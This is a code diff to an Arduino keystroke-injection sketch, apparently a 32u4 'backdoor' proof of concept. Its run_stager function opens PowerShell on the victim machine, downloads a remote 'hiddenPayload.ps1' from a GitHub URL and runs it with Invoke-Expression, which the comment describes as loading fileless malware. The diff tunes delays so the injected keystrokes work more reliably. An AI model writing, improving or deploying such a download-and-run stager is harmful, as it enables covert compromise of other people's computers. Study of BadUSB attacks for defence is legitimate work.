@@ -25,15 +25,20 @@ void run_stager(){
   // Run stager so we can load fileless malware.
   open_run();
   Keyboard.print("Powershell.exe");
+  delay(500);
   Keyboard.write(KEY_RETURN);
-  delay(200);
-  Keyboard.print("$uri = 'https://raw.githubusercontent.com/jarviscodes/32u4_backdoor_poc/master/test/hiddenPayload.ps1';clear;");
+  delay(1000);
+  Keyboard.print("$uri = 'https://raw.githubusercontent.com/jarviscodes/32u4_backdoor_poc/master/test/hiddenPayload.ps1'; clear;");
+  delay(1000);
   Keyboard.write(KEY_RETURN);
+  delay(1000);
   Keyboard.print("$script_content = $(Invoke-WebRequest($uri)).Content;clear;");
+  delay(1000);
   Keyboard.write(KEY_RETURN);
+  delay(1000);
   Keyboard.print("Invoke-Expression $script_content;clear;");
+  delay(1000);
   Keyboard.write(KEY_RETURN);
-
 }
 
 void send_payload(){
